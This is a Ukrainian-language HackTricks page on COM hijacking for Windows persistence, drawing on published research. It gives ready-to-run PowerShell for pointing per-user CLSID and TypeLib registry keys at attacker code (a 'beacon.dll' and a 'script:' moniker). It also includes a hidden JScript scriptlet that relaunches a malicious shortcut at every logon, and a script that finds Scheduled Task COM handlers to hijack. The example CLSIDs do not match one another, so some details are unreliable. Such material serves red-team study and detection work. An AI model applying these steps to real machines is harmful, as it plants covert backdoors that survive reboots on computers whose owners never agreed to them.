# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### Пошук неіснуючих COM компонентів

Оскільки значення HKCU можуть змінюватись користувачами, **COM Hijacking** може бути використаний як **постійний механізм**. Використовуючи `procmon`, легко знайти запити до COM записів реєстру, яких не існує, і які атакуючий може створити для персистенції. Фільтри:

- **RegOpenKey** операції.
- де _Result_ має значення **NAME NOT FOUND**.
- і _Path_ закінчується на **InprocServer32**.

Після того як ви вирішили, який неіснуючий COM підробити, виконайте наступні команди. _Будьте обережні, якщо вирішите підробити COM, який завантажується кожні кілька секунд — це може бути надмірним._
```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```
### COM-компоненти Task Scheduler, які можна перехопити

Завдання Windows використовують Custom Triggers для виклику COM-об'єктів, і оскільки вони виконуються через Task Scheduler, легше передбачити, коли вони будуть спрацьовувати.

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
if ($Task.Actions.ClassId -ne $null)
{
if ($Task.Triggers.Enabled -eq $true)
{
$usersSid = "S-1-5-32-545"
$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

if ($Task.Principal.GroupId -eq $usersGroup)
{
Write-Host "Task Name: " $Task.TaskName
Write-Host "Task Path: " $Task.TaskPath
Write-Host "CLSID: " $Task.Actions.ClassId
Write-Host
}
}
}
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

Переглянувши вивід, можна вибрати той, який виконуватиметься, наприклад, **кожного разу при вході користувача в систему**.

Тепер, шукаючи CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** у **HKEY\CLASSES\ROOT\CLSID** та в HKLM і HKCU, зазвичай ви знайдете, що значення не існує в HKCU.
```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```
Потім ви просто створюєте запис у HKCU, і щоразу, коли користувач входить у систему, ваш backdoor буде спрацьовувати.

---

## COM TypeLib Hijacking (script: moniker persistence)

Type Libraries (TypeLib) визначають COM-інтерфейси та завантажуються через `LoadTypeLib()`. Коли COM-сервер інстанціюється, ОС також може завантажити пов'язану TypeLib, звернувшись до ключів реєстру під `HKCR\TypeLib\{LIBID}`. Якщо шлях до TypeLib замінити на **moniker**, наприклад `script:C:\...\evil.sct`, Windows виконає scriptlet під час розв'язання TypeLib — створюючи приховану персистентність, яка спрацьовує, коли торкаються загальні компоненти.

Це спостерігалося щодо контролю Microsoft Web Browser (який часто завантажується Internet Explorer, додатками, що вбудовують WebBrowser, і навіть `explorer.exe`).

### Кроки (PowerShell)

1) Визначте TypeLib (LIBID), який використовується CLSID з високою частотою. Приклад CLSID, який часто зловмисники використовують у malware chains: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}` (Microsoft Web Browser).
```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```
2) Вкажіть per-user TypeLib path на локальний scriptlet, використовуючи монікер `script:` (права адміністратора не потрібні):
```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```
3) Розмістіть мінімальний JScript `.sct`, який перезапускає ваш основний payload (наприклад `.lnk`, який використовується початковим ланцюжком):
```xml
<?xml version="1.0"?>
<scriptlet>
<registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
<script language="JScript">
<![CDATA[
try {
var sh = new ActiveXObject('WScript.Shell');
// Re-launch the malicious LNK for persistence
var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
sh.Run(cmd, 0, false);
} catch(e) {}
]]>
</script>
</scriptlet>
```
4) Активація – відкриття IE, програми, що вбудовує WebBrowser control, або навіть звичайна активність Explorer завантажить TypeLib і виконає scriptlet, повторно активуючи ваш chain при logon/reboot.

Очищення
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```
Примітки
- Ви можете застосувати ту саму логіку до інших часто використовуваних COM компонентів; завжди спочатку визначайте реальний `LIBID` з `HKCR\CLSID\{CLSID}\TypeLib`.
- На 64-bit системах ви також можете заповнити підключ `win64` для 64-bit споживачів.

## Джерела

- [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)

{{#include ../../banners/hacktricks-training.md}}
